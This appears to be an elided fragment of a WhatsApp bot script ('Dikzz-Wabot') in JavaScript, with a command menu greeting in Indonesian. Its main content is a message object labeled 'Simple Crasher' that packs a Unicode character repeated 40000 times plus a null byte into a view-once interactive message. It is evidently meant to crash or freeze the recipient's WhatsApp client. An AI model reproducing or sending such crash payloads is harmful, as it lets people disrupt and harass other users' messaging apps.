...
const fkontak = {
  ...
  message: {
    orderMessage: {
      ...
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Gx Dikzz Simple Crasher`,
                ...
                viewOnceMessage: {
                    message: {
                        ...
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}Gx Dikzz Dari Selatan\n\u0000` }),
...
const replyWithCh = text => {
    const metadata = {
        title: 'Dikzz-Wabot',
        sourceUrl: 'https://wa.me/6285768090238'
    };
...
case "allcmd": {
let teksnya = `
Hai hai (*${pushname}*) aku adalah sii Dikzz-wabot ada yang bisa aku bantu? (*tapi aku masih tahap proses yaa*)
